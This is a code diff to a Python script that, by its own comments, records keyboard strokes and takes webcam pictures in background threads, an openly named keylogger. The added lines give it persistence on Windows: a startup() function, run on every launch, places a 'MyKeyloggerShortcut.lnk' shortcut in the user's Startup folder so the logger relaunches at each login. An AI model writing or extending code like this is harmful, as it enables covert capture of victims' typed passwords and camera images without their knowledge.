@@ -1,6 +1,12 @@
 # Dependencies: PYTHON3-PYNPUT
 # PYTHON3-PYGAME
 
+# To make it as a startup app for windows
+import os
+import sys
+import winshell
+from win32com.client import Dispatch
+
 
 # Create two threads, one for listening to keyboard strokes and one for taking pictures
 import threading 
@@ -31,6 +37,25 @@ extend = "."
 
 pygame.camera.init()
 camlist = pygame.camera.list_cameras()
+
+
+def startup():
+
+    script_path = os.path.abspath(sys.argv[0])
+       
+    startup_folder = winshell.startup()
+    shortcut_path = os.path.join(startup_folder, "MyKeyloggerShortcut.lnk")
+
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortcut(shortcut_path)
+    shortcut.TargetPath = script_path
+    shortcut.WorkingDirectory = os.path.dirname(script_path)
+    shortcut.IconLocation = script_path
+    shortcut.save()
+
+
+startup()
+
 
 # check if webcam exists
 
